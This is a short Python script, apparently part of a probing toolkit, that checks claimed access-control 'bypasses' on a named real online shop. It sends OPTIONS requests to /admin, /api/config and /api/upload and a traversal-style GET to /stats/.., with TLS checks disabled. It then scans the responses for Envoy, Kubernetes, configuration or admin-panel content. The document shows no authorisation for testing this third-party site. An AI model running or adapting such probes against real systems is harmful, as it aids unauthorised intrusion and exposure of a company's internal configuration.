#!/usr/bin/env python3
"""
Verify Bypasses - детальная проверка найденных обходов
"""

import requests
import json
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()

def verify_bypass(path, method='GET', headers=None):
    """Детальная проверка обхода"""
    base_url = "https://www.zooplus.de"
    url = urljoin(base_url, path)
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    if headers:
        session.headers.update(headers)
    
    try:
        resp = session.request(method, url, timeout=3, verify=False, allow_redirects=False)
        
        print(f"\n[*] Testing: {method} {path}")
        print(f"    Status: {resp.status_code}")
        print(f"    Headers: {dict(resp.headers)}")
        print(f"    Response length: {len(resp.text) if resp.text else 0}")
        
        if resp.text:
            # Check for interesting content
            content_lower = resp.text.lower()
            indicators = {
                'envoy': ['cluster', 'listener', 'envoy', 'upstream'],
                'kubernetes': ['kind', 'apiversion', 'metadata'],
                'config': ['config', 'setting', 'env'],
                'admin': ['admin', 'dashboard', 'panel']
            }
            
            for key, keywords in indicators.items():
                if any(kw in content_lower for kw in keywords):
                    print(f"    [!] Contains {key} indicators!")
                    print(f"    Response preview: {resp.text[:300]}")
                    return True
        
        return False
    except Exception as e:
        print(f"    Error: {e}")
        return False

if __name__ == "__main__":
    print("=" * 70)
    print("VERIFYING BYPASSES")
    print("=" * 70)
    
    # Проверяем найденные обходы
    bypasses = [
        ("/stats/..", "GET"),
        ("/stats", "OPTIONS"),
        ("/api/config", "OPTIONS"),
        ("/admin", "OPTIONS"),
        ("/api/upload", "OPTIONS"),
    ]
    
    for path, method in bypasses:
        verify_bypass(path, method)
    
    print("\n" + "=" * 70)
    print("Verification complete")

